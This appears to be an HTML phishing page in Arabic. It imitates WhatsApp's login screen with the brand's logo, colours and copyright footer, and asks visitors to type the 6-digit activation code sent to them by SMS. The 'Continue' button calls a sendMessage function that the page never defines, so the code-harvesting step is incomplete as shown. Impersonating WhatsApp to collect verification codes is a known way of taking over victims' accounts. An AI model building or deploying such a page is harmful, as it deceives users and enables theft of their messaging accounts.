<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>WhatsApp Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FAF3E7;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* الشريط العلوي */
        header {
            background-color: #25D366;
            color: white;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
        }

        header .logo {
            display: flex;
            align-items: center;
            font-size: 20px;
            font-weight: bold;
            white-space: nowrap;
        }

        header .logo img {
            height: 30px;
            margin-right: 10px;
        }

        header .menu {
            display: flex;
            flex-direction: column;
            justify-content: center;
            gap: 5px;
            cursor: pointer;
            position: relative;
        }

        header .menu span {
            display: block;
            width: 25px;
            height: 3px;
            background-color: white;
            border-radius: 5px;
        }

        /* القائمة المنسدلة */
        .dropdown {
            position: absolute;
            top: 40px;
            right: 0;
            background-color: white;
            color: black;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            display: none;
            flex-direction: column;
            width: 150px;
            text-align: center;
        }

        .dropdown a {
            padding: 10px;
            text-decoration: none;
            color: #333;
            border-bottom: 1px solid #ddd;
        }

        .dropdown a:hover {
            background-color: #f1f1f1;
        }

        .dropdown a:last-child {
            border-bottom: none;
        }

        .dropdown.active {
            display: flex;
        }

        /* المحتوى */
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            margin-top: 80px; /* ترك مسافة للشريط العلوي */
        }

        .container .logo img {
            height: 80px;
            margin-bottom: 20px;
        }

        .container .title {
            font-size: 22px;
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
        }

        .container .description {
            font-size: 14px;
            color: #555;
            text-align: center;
            margin-bottom: 20px;
        }

        .container .form-group {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            width: 100%;
            max-width: 300px;
        }

        .container input {
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 10px;
            font-size: 16px;
            width: 100%;
            text-align: center;
        }

        .container button {
            padding: 12px 20px;
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }

        .container button:hover {
            background-color: #1DA955;
        }

        /* الشريط السفلي */
        footer {
            background-color: #f1f1f1;
            color: #888;
            text-align: center;
            padding: 10px;
            font-size: 12px;
        }

        footer a {
            color: #25D366;
            text-decoration: none;
        }

        @media (max-width: 768px) {
            header {
                flex-wrap: nowrap;
            }

            header .logo {
                font-size: 18px;
                justify-content: center;
            }

            header .menu {
                margin-left: auto;
            }
        }
    </style>
</head>

<body>
    <!-- الشريط العلوي -->
    <header>
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
            <span>WhatsApp</span>
        </div>
        <div class="menu" onclick="toggleMenu()">
            <span></span>
            <span></span>
            <span></span>
            <div class="dropdown">
                <a href="#">سياسات الخصوصية</a>
                <a href="#">مركز المساعدة</a>
                <a href="#">شروط الخدمة</a>
            </div>
        </div>
    </header>

    <!-- المحتوى -->
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        </div>
        <div class="title">تسجيل الدخول</div>
        <div class="description">
            أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.
        </div>
        <div class="form-group">
            <input id="phoneNumber" type="text" placeholder="رمز التفعيل" maxlength="6" pattern="\d{6}" required>
            <button onclick="sendMessage()">متابعة</button>
        </div>
    </div>

    <!-- الشريط السفلي -->
    <footer>
        ©️ 2024 واتساب. جميع الحقوق محفوظة. <br>
        <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
    </footer>

    <script>
        // وظيفة فتح القائمة المنسدلة
        function toggleMenu() {
            const dropdown = document.querySelector('.dropdown');
            dropdown.classList.toggle('active');
        }
    </script>
</body>

</html>
